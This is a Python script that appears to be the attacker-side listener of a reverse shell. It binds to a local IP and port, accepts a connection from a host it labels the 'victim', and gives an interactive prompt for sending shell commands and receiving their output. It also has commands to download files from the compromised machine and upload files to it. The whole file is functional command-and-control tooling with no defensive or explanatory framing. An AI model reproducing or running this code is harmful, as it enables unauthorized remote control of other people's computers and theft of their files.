import socket,os,subprocess


class Listener:
    def __init__(self, IP, PORT):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((IP,PORT))
        self.listener.listen(0)
        print("[+] Waiting for incoming connection on PORT: " + str(PORT))
        try:
            self.connection, address = self.listener.accept()
        except KeyboardInterrupt:
            exit("\nEXIT")
        print("[+] New connection from " + str(address))
        self.victim = self.r_recv()

    def r_send(self, msg):
        msg = msg.encode()
        self.connection.send(msg)
     
    def r_recv(self):
        data = ""
        while (not data.endswith("done")):
            data += self.connection.recv(1024).decode()
        return data[:-4]

    def download(self, filename):
        f = open(filename,"wb")
        while(True):
            packet = self.connection.recv(1024)
            if "[-] File not found".encode() in packet:
                print("[-] File not found")
                os.remove(filename)
                break
            elif packet.endswith("done".encode()):
                f.write(packet[:-4])
                f.close()
                print("[+] Download completed")
                break
            f.write(packet)

    def upload(self,filename):
        if os.path.exists(filename):
            f = open(filename,'rb')
            packet = f.read(1024)
            while(len(packet)>0):
                self.connection.send(packet)
                packet = f.read(1024)
            self.connection.send("done".encode())
        else:
            self.connection.send("[-] File not found".encode())
            print("[-] File not found")

    def run(self):
        while(True):
            try:
                cmd = str(input("[" + self.victim + "]>> "))
                if(len(cmd.strip())<1):
                    self.run()
                self.r_send(cmd)
                cmd = cmd.split(' ')
                if cmd[0] == "download":
                    self.download(cmd[1])
                elif cmd[0] == "upload":
                    self.upload(cmd[1])
                elif len(cmd)<2 and cmd[0] == "cd":
                    print("[-] Please select a directory")
                elif cmd[0] == "clear":
                    subprocess.call('clear',shell=True)
                else:
                    result = self.r_recv()
                    print(result)
                    

                
                

            except KeyboardInterrupt:
                self.r_send("terminate")
                self.connection.close()
                exit("\nEXIT")

listener = Listener("192.168.1.99",2000)
listener.run()